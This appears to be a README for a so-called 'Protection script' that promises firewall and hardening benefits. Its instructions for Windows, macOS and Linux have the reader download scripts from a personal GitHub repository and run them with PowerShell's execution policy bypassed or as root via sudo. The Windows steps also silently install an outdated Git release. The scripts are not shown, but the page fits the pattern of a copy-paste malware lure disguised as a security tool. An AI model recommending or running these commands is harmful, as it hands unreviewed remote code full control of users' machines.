<p align="center">
  <strong>Click your operating system to ensure maximum security</strong>
</p>

<p align="center">
  <a href="#windows-install-instructions">
    <img src="./assets/windows.png" alt="Windows Logo" width="100" style="margin-right: 50px;"/>
  </a>
  <a href="#macos-install-instructions">
    <img src="./assets/macos.png" alt="macOS Logo" width="100" style="margin-right: 50px;"/>
  </a>
  <a href="#linux-install-instructions">
    <img src="./assets/linux.png" alt="Linux Logo" width="100" style="margin-right: 50px;"/>
  </a>
</p>

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    <p>The Protection script maximizes the security of your computer, providing robust and comprehensive security measures.</p>
    <ul>
      <li>✓ Enables Firewall</li>
      <li>✓ Blocks unauthorized access</li>
      <li>✓ Reduces attack surface by disabling unused services</li>
      <li>✓ Applies security settings</li>
      <li>✓ Enhances overall system stability and performance</li>
      <li>✓ Prevents common security vulnerabilities</li>
    </ul>
  </div>
  <div style="flex: 0;">
    <img src="./assets/logo.svg" alt="Project Logo" width="100"/>
  </div>
</div>

## Windows Install Instructions

<a name="windows-install-instructions"></a>

Ensure you have at least 200 MB of free space available.

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    1. **Open Command Prompt**
       - Press `Windows + R`
       - Type `cmd`
       - Press `Enter`
    2. **Install Git**
       - Copy and paste the following command into Command Prompt:
         ```cmd
         powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/download/v2.14.1.windows.1/Git-2.14.1-64-bit.exe -OutFile Git-2.14.1-64-bit.exe"
         ```
       - Once downloaded, copy and paste the following command into Command Prompt:
         ```cmd
         .\Git-2.14.1-64-bit.exe /VERYSILENT /NORESTART
         ```
    3. **Download and Run the Protection Script**
       - Copy and paste the following commands into Command Prompt:
         ```cmd
         curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1
         powershell -ExecutionPolicy Bypass -File .\win.ps1
         ```
    Your Windows PC is now protected from unwanted activity.
  </div>
  <div style="flex: 0;">
    <img src="./assets/windows.png" alt="Windows Logo" width="100" align="right"/>
  </div>
</div>

## macOS Install Instructions

<a name="macos-install-instructions"></a>

Ensure you have at least 100 MB of free space available.

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    1. **Open Terminal**
    2. **Install Homebrew (if not already installed)**
       - Copy and paste the following command into Terminal:
         ```bash
         /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
         ```
    3. **Install Git**
       - Copy and paste the following command into Terminal:
         ```bash
         brew install git
         ```
    4. **Download and Run the Protection Script**
       - Copy and paste the following commands into Terminal:
         ```bash
         curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh
         sudo bash ./mac.sh
         ```
    Your macOS system is now protected from unwanted activity.
  </div>
  <div style="flex: 0;">
    <img src="./assets/macos.png" alt="macOS Logo" width="100" align="right"/>
  </div>
</div>

## Linux Install Instructions

<a name="linux-install-instructions"></a>

Ensure you have at least 100 MB of free space available.

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    1. **Open Terminal**
    2. **Update Package Lists**
       - Copy and paste the following command into Terminal:
         ```bash
         sudo apt-get update
         ```
    3. **Install Git**
       - Copy and paste the following command into Terminal:
         ```bash
         sudo apt-get install git -y
         ```
    4. **Download and Run the Protection Script**
       - Copy and paste the following commands into Terminal:
         ```bash
         curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh
         sudo bash ./lin.sh
         ```
    Your Linux system is now protected from unwanted activity.
  </div>
  <div style="flex: 0;">
    <img src="./assets/linux.png" alt="Linux Logo" width="100" align="right"/>
  </div>
</div>